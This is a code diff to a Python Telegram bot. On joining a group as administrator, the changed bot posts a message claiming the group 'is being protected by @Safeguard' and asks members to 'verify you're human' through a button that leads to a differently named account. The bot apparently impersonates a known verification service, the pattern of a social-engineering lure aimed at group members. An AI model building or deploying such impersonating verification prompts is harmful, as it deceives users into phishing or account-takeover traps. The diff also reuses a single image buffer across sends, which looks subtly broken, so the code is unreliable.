@@ -27,6 +27,11 @@ Safeguard_Image = Image.open('assets/safeguard1.jpg')
 verify_btn = InlineKeyboardButton(text="VERIFY", url="https://t.me/@whalesharka")
 url="https://docs.safeguard.run/group-security/verification-issues"
 
+tap_btn = InlineKeyboardButton(text="Tap to verify", url="https://t.me/Wh_SafeguardUXRobot")
+
+bio = BytesIO()
+Safeguard_Image.save(bio, format="JPEG")
+bio.seek(0)
 async def chat_member_updated(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global WELCOME_SENT
     
@@ -47,10 +52,16 @@ async def chat_member_updated(update: Update, context: ContextTypes.DEFAULT_TYPE
             
             try:
                 chat_type = "channel" if member_update.chat.type == ChatType.CHANNEL else "group"
-                
-                await context.bot.send_message(
+                keyboard = [[tap_btn]]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+
+                await context.bot.send_photo(
                     chat_id=chat_id,
-                    text=f"Hello everyone! I've joined this {chat_type} as an administrator."
+                    photo=bio,
+                    caption=f"""{member_update.chat.title} is being protected by @Safeguard
+Click below to verify you're human
+""",
+                    reply_markup=reply_markup
                 )
                 WELCOME_SENT.add(chat_id)
                 print(f"Welcome message sent to {chat_type} {chat_id}")
@@ -81,9 +92,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 "Click 'VERIFY' and complete captcha to gain entry - "'<a href="https://docs.safeguard.run/group-security/verification-issues">Not working?</a>'  
     )
-    bio = BytesIO()
-    Safeguard_Image.save(bio, format="JPEG")
-    bio.seek(0)
     await update.message.reply_photo(photo=bio, caption=message, reply_markup=reply_markup, parse_mode='HTML') 
 
 def main():
